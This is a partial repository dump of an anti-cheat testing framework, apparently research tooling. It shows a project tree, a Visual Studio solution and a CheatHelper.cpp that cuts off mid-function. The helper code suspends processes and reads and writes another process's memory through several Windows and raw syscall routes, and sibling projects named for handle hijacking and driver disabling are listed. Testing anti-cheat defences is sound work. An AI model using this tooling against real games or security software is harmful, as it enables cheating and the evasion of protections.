Project Path: arc_niemand-sec_AntiCheat-Testing-Framework_fiszcv4w

Source Tree:

```txt
arc_niemand-sec_AntiCheat-Testing-Framework_fiszcv4w
├── AntiCheat-Testing-Framework.sln
├── CheatHelper
│   ├── CheatHelper.cpp
│   ├── CheatHelper.h
│   ├── CheatHelper.vcxproj
│   ├── CheatHelper.vcxproj.filters
│   ├── Readme.md
│   ├── ZwReadWriteVM.asm
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── DriverDisabler
│   ├── DriverDisabler.cpp
│   ├── DriverDisabler.vcxproj
│   ├── DriverDisabler.vcxproj.filters
│   ├── README.md
│   ├── pch.cpp
│   └── pch.h
├── DriverHelper
│   ├── DriverHelper.cpp
│   ├── DriverHelper.h
│   ├── DriverHelper.vcxproj
│   ├── DriverHelper.vcxproj.filters
│   ├── Readme.md
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── DriverTester
│   ├── DriverTester.cpp
│   ├── DriverTester.vcxproj
│   ├── DriverTester.vcxproj.filters
│   ├── LoadDriver.bat
│   ├── Readme.md
│   ├── pch.cpp
│   └── pch.h
├── ExternalCheatDriver
│   ├── ExternalCheatDriver.cpp
│   ├── ExternalCheatDriver.vcxproj
│   ├── HandleElevationDriver.vcxproj.filters
│   ├── LoadDriver.bat
│   ├── Readme.md
│   ├── pch.cpp
│   └── pch.h
├── HandleElevationDriver
│   ├── HandleElevationDriver.cpp
│   ├── HandleElevationDriver.vcxproj
│   ├── HandleElevationDriver.vcxproj.filters
│   ├── LoadDriver.bat
│   ├── Readme.md
│   ├── pch.cpp
│   └── pch.h
├── HandleHijackingDLL
│   ├── HandleHijackingDLL.cpp
│   ├── HandleHijackingDLL.vcxproj
│   ├── HandleHijackingDLL.vcxproj.filters
│   ├── README.md
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── HandleHijackingMaster
│   ├── HandleHijackingMaster.cpp
│   ├── HandleHijackingMaster.vcxproj
│   ├── HandleHijackingMaster.vcxproj.filters
│   ├── README.md
│   ├── pch.cpp
│   └── pch.h
├── LuaHook
├── README.md
├── StealthHijackingNormalDLL
│   ├── Readme.md
│   ├── StealthHijackingNormalDLL.cpp
│   ├── StealthHijackingNormalDLL.vcxproj
│   ├── StealthHijackingNormalDLL.vcxproj.filters
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── StealthHijackingNormalMaster
│   ├── Readme.md
│   ├── StealthHijackingNormalMaster.cpp
│   ├── StealthHijackingNormalMaster.vcxproj
│   ├── StealthHijackingNormalMaster.vcxproj.filters
│   ├── pch.cpp
│   └── pch.h
├── config.ini
└── resources
    └── MinHook
        ├── include
        │   └── MinHook.h
        └── lib
            └── libMinHook-x64-v141-mdd.lib

```

`AntiCheat-Testing-Framework.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.168
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HandleHijackingDLL", "HandleHijackingDLL\HandleHijackingDLL.vcxproj", "{FA4A27D2-1F04-4DDA-A10C-D19640522328}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HandleHijackingMaster", "HandleHijackingMaster\HandleHijackingMaster.vcxproj", "{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "CheatHelper", "CheatHelper\CheatHelper.vcxproj", "{A080C117-D1DB-4671-8217-65496573BA4D}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DriverDisabler", "DriverDisabler\DriverDisabler.vcxproj", "{723D6B45-EEBA-4C09-8528-4373BAFF330A}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "StealthHijackingNormalMaster", "StealthHijackingNormalMaster\StealthHijackingNormalMaster.vcxproj", "{F74258DB-52A4-4B60-8FBE-385091D35DCA}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "StealthHijackingNormalDLL", "StealthHijackingNormalDLL\StealthHijackingNormalDLL.vcxproj", "{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DriverTester", "DriverTester\DriverTester.vcxproj", "{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HandleElevationDriver", "HandleElevationDriver\HandleElevationDriver.vcxproj", "{97D0792B-4385-450B-9E85-79494037D730}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DriverHelper", "DriverHelper\DriverHelper.vcxproj", "{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ExternalCheatDriver", "ExternalCheatDriver\ExternalCheatDriver.vcxproj", "{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Debug|x64.ActiveCfg = Debug|x64
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Debug|x64.Build.0 = Debug|x64
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Debug|x86.ActiveCfg = Debug|Win32
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Debug|x86.Build.0 = Debug|Win32
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Release|x64.ActiveCfg = Release|x64
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Release|x64.Build.0 = Release|x64
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Release|x86.ActiveCfg = Release|Win32
		{FA4A27D2-1F04-4DDA-A10C-D19640522328}.Release|x86.Build.0 = Release|Win32
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Debug|x64.ActiveCfg = Debug|x64
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Debug|x64.Build.0 = Debug|x64
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Debug|x86.ActiveCfg = Debug|Win32
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Debug|x86.Build.0 = Debug|Win32
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Release|x64.ActiveCfg = Release|x64
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Release|x64.Build.0 = Release|x64
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Release|x86.ActiveCfg = Release|Win32
		{8B5D48FC-71B6-40DA-9415-64CF55DC29FF}.Release|x86.Build.0 = Release|Win32
		{A080C117-D1DB-4671-8217-65496573BA4D}.Debug|x64.ActiveCfg = Debug|x64
		{A080C117-D1DB-4671-8217-65496573BA4D}.Debug|x64.Build.0 = Debug|x64
		{A080C117-D1DB-4671-8217-65496573BA4D}.Debug|x86.ActiveCfg = Debug|Win32
		{A080C117-D1DB-4671-8217-65496573BA4D}.Debug|x86.Build.0 = Debug|Win32
		{A080C117-D1DB-4671-8217-65496573BA4D}.Release|x64.ActiveCfg = Release|x64
		{A080C117-D1DB-4671-8217-65496573BA4D}.Release|x64.Build.0 = Release|x64
		{A080C117-D1DB-4671-8217-65496573BA4D}.Release|x86.ActiveCfg = Release|Win32
		{A080C117-D1DB-4671-8217-65496573BA4D}.Release|x86.Build.0 = Release|Win32
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Debug|x64.ActiveCfg = Debug|x64
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Debug|x64.Build.0 = Debug|x64
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Debug|x86.ActiveCfg = Debug|Win32
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Debug|x86.Build.0 = Debug|Win32
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Release|x64.ActiveCfg = Release|x64
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Release|x64.Build.0 = Release|x64
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Release|x86.ActiveCfg = Release|Win32
		{723D6B45-EEBA-4C09-8528-4373BAFF330A}.Release|x86.Build.0 = Release|Win32
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Debug|x64.ActiveCfg = Debug|x64
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Debug|x64.Build.0 = Debug|x64
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Debug|x86.ActiveCfg = Debug|Win32
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Debug|x86.Build.0 = Debug|Win32
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Release|x64.ActiveCfg = Release|x64
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Release|x64.Build.0 = Release|x64
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Release|x86.ActiveCfg = Release|Win32
		{F74258DB-52A4-4B60-8FBE-385091D35DCA}.Release|x86.Build.0 = Release|Win32
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Debug|x64.ActiveCfg = Debug|x64
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Debug|x64.Build.0 = Debug|x64
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Debug|x86.ActiveCfg = Debug|Win32
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Debug|x86.Build.0 = Debug|Win32
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Release|x64.ActiveCfg = Release|x64
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Release|x64.Build.0 = Release|x64
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Release|x86.ActiveCfg = Release|Win32
		{09373BE0-A33D-4D50-8148-E9DF5EF1ABCE}.Release|x86.Build.0 = Release|Win32
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Debug|x64.ActiveCfg = Debug|x64
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Debug|x64.Build.0 = Debug|x64
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Debug|x86.ActiveCfg = Debug|Win32
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Debug|x86.Build.0 = Debug|Win32
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Release|x64.ActiveCfg = Release|x64
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Release|x64.Build.0 = Release|x64
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Release|x86.ActiveCfg = Release|Win32
		{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}.Release|x86.Build.0 = Release|Win32
		{97D0792B-4385-450B-9E85-79494037D730}.Debug|x64.ActiveCfg = Debug|x64
		{97D0792B-4385-450B-9E85-79494037D730}.Debug|x64.Build.0 = Debug|x64
		{97D0792B-4385-450B-9E85-79494037D730}.Debug|x86.ActiveCfg = Debug|Win32
		{97D0792B-4385-450B-9E85-79494037D730}.Debug|x86.Build.0 = Debug|Win32
		{97D0792B-4385-450B-9E85-79494037D730}.Release|x64.ActiveCfg = Release|x64
		{97D0792B-4385-450B-9E85-79494037D730}.Release|x64.Build.0 = Release|x64
		{97D0792B-4385-450B-9E85-79494037D730}.Release|x86.ActiveCfg = Release|Win32
		{97D0792B-4385-450B-9E85-79494037D730}.Release|x86.Build.0 = Release|Win32
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Debug|x64.ActiveCfg = Debug|x64
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Debug|x64.Build.0 = Debug|x64
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Debug|x86.ActiveCfg = Debug|Win32
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Debug|x86.Build.0 = Debug|Win32
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Release|x64.ActiveCfg = Release|x64
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Release|x64.Build.0 = Release|x64
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Release|x86.ActiveCfg = Release|Win32
		{36244BA2-D910-4746-8ED2-7CFA55FB4DE9}.Release|x86.Build.0 = Release|Win32
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Debug|x64.ActiveCfg = Debug|x64
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Debug|x64.Build.0 = Debug|x64
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Debug|x86.ActiveCfg = Debug|Win32
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Debug|x86.Build.0 = Debug|Win32
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Release|x64.ActiveCfg = Release|x64
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Release|x64.Build.0 = Release|x64
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Release|x86.ActiveCfg = Release|Win32
		{99F47B02-FAAF-4C0D-9D9B-DFAD35E1F38B}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {4B354B9C-B814-457A-8FF5-722BFE9C944E}
	EndGlobalSection
EndGlobal

```

`CheatHelper/CheatHelper.cpp`:

```cpp
#include "CheatHelper.h"
#include <stdio.h>
#include <TlHelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <tchar.h> 
#include <iomanip>


// Check windows
#if _WIN32 || _WIN64
	#if _WIN64
		#define ENV64BIT
	#else
		#define ENV32BIT
	#endif
#endif


// WINAPI Functions

typedef LONG(NTAPI *NtSuspendProcess)(IN HANDLE ProcessHandle);
void CheatHelper::Suspend(DWORD processId)
{
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	NtSuspendProcess pfnNtSuspendProcess = (NtSuspendProcess)GetProcAddress(GetModuleHandle("ntdll"), "NtSuspendProcess");

	pfnNtSuspendProcess(processHandle);
	CloseHandle(processHandle);
}

typedef LONG(NTAPI *NtResumeProcess)(IN HANDLE ProcessHandle);
void CheatHelper::Resume(DWORD processId)
{
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	NtResumeProcess pfnNtResumeProcess = (NtResumeProcess)GetProcAddress(GetModuleHandle("ntdll"), "NtResumeProcess");

	pfnNtResumeProcess(processHandle);
	CloseHandle(processHandle);
}

//typedef BOOL StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
extern "C" NTSTATUS ZwWriteVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
extern "C" NTSTATUS ZwReadVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);


// Process Functions
DWORD CheatHelper::GetProcId(char* procName)
{
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry);

		if (Process32First(hSnap, &procEntry))
		{
			do
			{
				if (!_stricmp(procEntry.szExeFile, procName))
				{
					procId = procEntry.th32ProcessID;
					std::cout << "[+] Process Found!\n";
					break;
				}
			} while (Process32Next(hSnap, &procEntry));

		}
	}
	CloseHandle(hSnap);
	return procId;
}



// DEBUGING functions
void CheatHelper::ConsoleSetup(const char * title)
{
	// With this trick we'll be able to print content to the console, and if we have luck we could get information printed by the game.
	AllocConsole();
	SetConsoleTitle(title);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	freopen("CONIN$", "r", stdin);
}

void CheatHelper::PrintBytes(PVOID buffer, SIZE_T  nSize)
{
	/*
	for (int i = 0; i < sizeof(buffer); i++) {
		std::cout << std::setfill('0') << std::setw(2) << std::hex << (int)((char*)buffer)[i] << " ";
	}
	std::cout << std::endl;
	*/
	/*
	printf("[ ");
	for (size_t i = 0; i < sizeof(buffer); i++)
	{
		printf("%02x ", ((char*)buffer)[i]);
	}
	printf("]\n");
	*/
	UCHAR * uBuf = (UCHAR*)buffer;
	for (uint32_t i = 0; i != nSize; i++)
	{
		std::cout <<
			std::hex <<           // output in hex
			std::setw(2) <<       // each byte prints as two characters
			static_cast<unsigned int>(uBuf[i]) << " ";
			std::setfill('0'); // fill with 0 if not enough characters
	}
	std::cout << std::endl;
}

// Memory functions
// It will do RPM and print the memory obtained. It will return the buffer value too on the parameter buffer
int CheatHelper::RPM(HANDLE  hProcess, LPCVOID lpBaseAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead)
{
	int status = ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
	if (status == 0)
	{
		std::cout << "[-] ReadProcessMemory failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	//std::cout << "[+] ReadProcessMemory: " << lpBuffer << std::endl;
	std::cout << "[+] ReadProcessMemory: \n\t";
	CheatHelper::PrintBytes((PVOID)lpBuffer, nSize);
	return 0;
}

int CheatHelper::WPM(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten)
{
	int status = WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	if (status == 0)
	{
		std::cout << "[-] WriteProcessMemory failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	//std::cout << "[+] WriteProcessMemory: " << lpBuffer << std::endl;
	std::cout << "[+] WriteProcessMemory: \n\t" ;
	CheatHelper::PrintBytes((PVOID)lpBuffer, nSize);
	return 0;
}

int CheatHelper::NtRVM(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded)
{
	TNtReadVirtualMemory pfnNtReadVirtualMemory = (TNtReadVirtualMemory)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtReadVirtualMemory");

	auto status = pfnNtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesReaded);
	if (status != 0)
	{
		std::cout << "[-] NtReadVirtualMemory failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	//std::cout << "[+] NtReadVirtualMemory: " << &Buffer << std::endl;
	std::cout << "[+] NtReadVirtualMemory: \n\t";
	CheatHelper::PrintBytes((PVOID)Buffer, NumberOfBytesToRead);
	return 0;

}

int CheatHelper::NtWVM(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG  NumberOfBytesWritten)
{
	TNtWriteVirtualMemory pfnNtWriteVirtualMemory = (TNtWriteVirtualMemory)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtWriteVirtualMemory");
	SIZE_T stWrite = 0;

	int status = pfnNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
	if (status != 0)
	{
		std::cout << "[-] NtWriteVirtualMemory Failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	//std::cout << "[+] NtWriteVirtualMemory: " << &Buffer << std::endl;
	std::cout << "[+] NtWriteVirtualMemory: \n\t";
	CheatHelper::PrintBytes((PVOID)Buffer, NumberOfBytesToWrite);
	return 0;
}


int CheatHelper::ZwRVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded = NULL)
{
	auto status = ZwReadVM(hProc, pBaseAddress, pBuffer, NumberOfBytesToRead, NumberOfBytesReaded);
	if (status != 0)
	{
		std::cout << "[-] ZwReadVirtualMemory failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	//std::cout << "[+] NtReadVirtualMemory: " << &Buffer << std::endl;
	std::cout << "[+] ZwReadVirtualMemory: \n\t";
	CheatHelper::PrintBytes((PVOID)pBuffer, NumberOfBytesToRead);
	return 0;

}

int CheatHelper::ZwWVM(HANDLE hProc, PVOID pBaseAddress, PVOID pBuffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten = NULL)
{
	//SIZE_T stWrite = 0;

	int status = ZwWriteVM(hProc, pBaseAddress, pBuffer, NumberOfBytesToWrite, NumberOfBytesWritten);
	if (status != 0)
	{
		std::cout << "[-] ZwWriteVirtualMemory Failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	//std::cout << "[+] NtWriteVirtualMemory: " << &Buffer << std::endl;
	std::cout << "[+] ZwWriteVirtualMemory: \n\t";
	CheatHelper::PrintBytes((PVOID)pBuffer, NumberOfBytesToWrite);
	return 0;
}



// NamedPipe functions



// FileMapping


bool CheatHelper::checkSpinLockByte(LPVOID pFileMapMem, byte value)
{
	//Read last byte to validate if the pivot connected to the shared memory
	//We will use the last byte of the FILEMAP (FILEMAPSIZE-1)
	int n;
	BYTE init = value;
	void * dest = (void *)((intptr_t)pFileMapMem + FILEMAPSIZE - 1);
	std::cout << "[+] Waiting for pivot." << std::endl;
	while (1)
	{
		n = memcmp(dest, &init, sizeof(BYTE));
		if (n == 0)
		{
			std::cout << "[+] Pivot Ready." << std::endl;
			break;
		}
		else
		{
			Sleep(500);
			continue;
		}
	}
	return 0;
}

bool CheatHelper::setSpinLockByte(LPVOID pFileMapMem, byte value)
{
	BYTE init = value;
	void * dest = (void *)((intptr_t)pFileMapMem + FILEMAPSIZE - 1);
	CopyMemory(dest, &init, sizeof(BYTE));
	std::cout << "[+] Ready." << std::endl;
	return 1;
}


void CheatHelper::prepareRequest(PipeMessageRequest &PMRequest)
{
	switch (PMRequest.action) {
	case 0: //Ping
	{
		std::cout << '0' << std::endl;
		break;
	}
	case 1: //RPM
	{
		std::cout << "[+] RPM" << std::endl;
		PMRequest.address = CheatHelper::RPMAddress;
		SecureZeroMemory(PMRequest.buffer, BUFSIZE);
		PMRequest.size = (int)CheatHelper::RPMBufferSize;
		break;
	}
	case 2: //WPM
	{
		std::cout << "[+] WPM" << std::endl;
		PMRequest.address = CheatHelper::WPMAddress;
		strncpy_s(PMRequest.buffer, CheatHelper::WPMBuffer, BUFSIZE);
		PMRequest.size = (int)CheatHelper::WPMBufferSize;
		break;
	}
	case 3: //CreatRemoteThread
	{
		std::cout << "[!] CRThread unavailable." << std::endl;
		break;
	}
	case 4: //NtReadVirtualMemory
	{
		std::cout << "[+] NtReadVirtualMemory" << std::endl;
		PMRequest.address = CheatHelper::ntRVMAddress;
		SecureZeroMemory(PMRequest.buffer, BUFSIZE);
		PMRequest.size = (int)CheatHelper::ntRVMBufferSize;
		break;
	}
	case 5: //NtWriteVirtualMemory
	{
		std::cout << "[+] NtWriteVirtualMemory" << std::endl;
		PMRequest.address = CheatHelper::ntWVMAddress;
		strncpy_s(PMRequest.buffer, CheatHelper::ntWVMBuffer, BUFSIZE);
		PMRequest.size = (int)CheatHelper::ntWVMBufferSize;
		break;
	}
	case 6: //ZwReadVirtualMemory
	{
		std::cout << "[+] ZwReadVirtualMemory" << std::endl;
		PMRequest.address = CheatHelper::ZwRVMAddress;
		SecureZeroMemory(PMRequest.buffer, BUFSIZE);
		PMRequest.size = (int)CheatHelper::ZwRVMBufferSize;
		break;
	}
	case 7: //ZwWriteVirtualMemory
	{
		std::cout << "[+] ZwWriteVirtualMemory" << std::endl;
		PMRequest.address = CheatHelper::ZwWVMAddress;
		strncpy_s(PMRequest.buffer, CheatHelper::ZwWVMBuffer, BUFSIZE);
		PMRequest.size = (int)CheatHelper::ZwWVMBufferSize;
		break;
	}
	}
}


//States
bool CheatHelper::bDelayExecution;

//Addresses
intptr_t CheatHelper::RPMAddressHigh;
intptr_t CheatHelper::RPMAddressLow;
intptr_t CheatHelper::RPMAddress;
intptr_t CheatHelper::WPMAddressHigh;
intptr_t CheatHelper::WPMAddressLow;
intptr_t CheatHelper::WPMAddress;
intptr_t CheatHelper::ntRVMAddressHigh;
intptr_t CheatHelper::ntRVMAddressLow;
intptr_t CheatHelper::ntRVMAddress;
intptr_t CheatHelper::ntWVMAddressHigh;
intptr_t CheatHelper::ntWVMAddressLow;
intptr_t CheatHelper::ntWVMAddress;
intptr_t CheatHelper::ZwRVMAddressHigh;
intptr_t CheatHelper::ZwRVMAddressLow;
intptr_t CheatHelper::ZwRVMAddress;
intptr_t CheatHelper::ZwWVMAddressHigh;
intptr_t CheatHelper::ZwWVMAddressLow;
intptr_t CheatHelper::ZwWVMAddress;

DWORDLONG CheatHelper::startAddressPhyHigh;
DWORDLONG CheatHelper::startAddressPhyLow;
DWORDLONG CheatHelper::startAddressPhy;

//Handles
HANDLE CheatHelper::requestHandleNP = NULL;
HANDLE CheatHelper::requestHandleFM = NULL;
HANDLE CheatHelper::requestHandleDrv = NULL;



//Buffers
char CheatHelper::RPMBuffer[BUFSIZE];
char CheatHelper::WPMBuffer[BUFSIZE];
char CheatHelper::ntRVMBuffer[BUFSIZE];
char CheatHelper::ntWVMBuffer[BUFSIZE];
char CheatHelper::ZwRVMBuffer[BUFSIZE];
char CheatHelper::ZwWVMBuffer[BUFSIZE];
SIZE_T CheatHelper::RPMBufferSize;
SIZE_T CheatHelper::WPMBufferSize;
SIZE_T CheatHelper::ntRVMBufferSize;
SIZE_T CheatHelper::ntWVMBufferSize;
SIZE_T CheatHelper::ZwRVMBufferSize;
SIZE_T CheatHelper::ZwWVMBufferSize;

//Shared Memory
//LPTSTR CheatHelper::sPipeName;

//Strings
char CheatHelper::targetProc[];
char CheatHelper::privotProc[];
char CheatHelper::namedPipeName[];
char CheatHelper::fileMapName[];
char CheatHelper::driverName[];

// Configuration file (INI)
bool CheatHelper::loadConfig()
{
	//LPCTSTR configFile = _T(".\\..\\..\\config.ini");
	LPCTSTR configFile = _T("E:\\Recon2019\\AntiCheat-Testing-Framework-Private\\config.ini");
	std::cout << "[+] Reading config file." << std::endl;

	//States
	CheatHelper::bDelayExecution = (bool)GetPrivateProfileInt("Addresses", "bDelayExecution", 0, configFile);
	std::cout << "\t[.] bDelayExecution " << std::hex << CheatHelper::bDelayExecution << std::endl;

	//Addresses
	#if defined(ENV64BIT)
		// GetPrivateProfileInt does not allow to obtain int64 values, we need this for x64 processes
		CheatHelper::RPMAddressHigh = GetPrivateProfileInt("Addresses", "RPMAddressHigh", 0x0, configFile);
		CheatHelper::RPMAddressLow = GetPrivateProfileInt("Addresses", "RPMAddressLow", 0x0, configFile);
		CheatHelper::WPMAddressHigh = GetPrivateProfileInt("Addresses", "WPMAddressHigh", 0x0, configFile);
		CheatHelper::WPMAddressLow = GetPrivateProfileInt("Addresses", "WPMAddressLow", 0x0, configFile);
		CheatHelper::ntRVMAddressHigh = GetPrivateProfileInt("Addresses", "ntRVMAddressHigh", 0x0, configFile);
		CheatHelper::ntRVMAddressLow = GetPrivateProfileInt("Addresses", "ntRVMAddressLow", 0x0, configFile);
		CheatHelper::ntWVMAddressHigh = GetPrivateProfileInt("Addresses", "ntWVMAddressHigh", 0x0, configFile);
		CheatHelper::ntWVMAddressLow = GetPrivateProfileInt("Addresses", "ntWVMAddressLow", 0x0, configFile);
		CheatHelper::ZwRVMAddressHigh = GetPrivateProfileInt("Addresses", "ZwRVMAddressHigh", 0x0, configFile);
		CheatHelper::ZwRVMAddressLow = GetPrivateProfileInt("Addresses", "ZwRVMAddressLow", 0x0, configFile);
		CheatHelper::ZwWVMAddressHigh = GetPrivateProfileInt("Addresses", "ZwWVMAddressHigh", 0x0, configFile);
		CheatHelper::ZwWVMAddressLow = GetPrivateProfileInt("Addresses", "ZwWVMAddressLow", 0x0, configFile);
		CheatHelper::startAddressPhyHigh = GetPrivateProfileInt("Addresses", "startAddressPhyHigh", 0x0, configFile);
		CheatHelper::startAddressPhyLow = GetPrivateProfileInt("Addresses", "startAddressPhyLow", 0x0, configFile);

		CheatHelper::RPMAddress = CheatHelper::RPMAddressHigh << 32 | CheatHelper::RPMAddressLow;
		CheatHelper::WPMAddress = CheatHelper::WPMAddressHigh << 32 | CheatHelper::WPMAddressLow;
		CheatHelper::ntRVMAddress = CheatHelper::ntRVMAddressHigh << 32 | CheatHelper::ntRVMAddressLow;
		CheatHelper::ntWVMAddress = CheatHelper::ntWVMAddressHigh << 32 | CheatHelper::ntWVMAddressLow;
		CheatHelper::ZwRVMAddress = CheatHelper::ZwRVMAddressHigh << 32 | CheatHelper::ZwRVMAddressLow;
		CheatHelper::ZwWVMAddress = CheatHelper::ZwWVMAddressHigh << 32 | CheatHelper::ZwWVMAddressLow;
		CheatHelper::startAddressPhy = CheatHelper::startAddressPhyHigh << 32 | CheatHelper::startAddressPhyLow;


	#elif defined (ENV32BIT)
		CheatHelper::RPMAddress = GetPrivateProfileStruct("Addresses", "RPMAddress", (LPVOID)CheatHelper::RPMAddress, 0x8, configFile);
		CheatHelper::WPMAddress = GetPrivateProfileInt("Addresses", "WPMAddress", 0x0, configFile);
